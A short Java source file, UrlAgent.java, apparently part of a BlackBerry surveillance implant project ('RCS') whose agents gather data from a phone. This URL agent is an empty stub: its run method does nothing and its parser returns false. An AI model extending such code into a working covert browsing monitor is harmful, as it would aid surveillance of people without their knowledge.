//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : UrlAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class UrlAgent.
 */
public final class UrlAgent extends Agent {
    //#ifdef DEBUG
    static Debug debug = new Debug("UrlAgent", DebugLevel.VERBOSE);
    //#endif

    /**
     * Instantiates a new url agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public UrlAgent(final boolean agentStatus) {
        super(Agent.AGENT_URL, agentStatus, true, "UrlAgent");
    }

    /**
     * Instantiates a new url agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected UrlAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
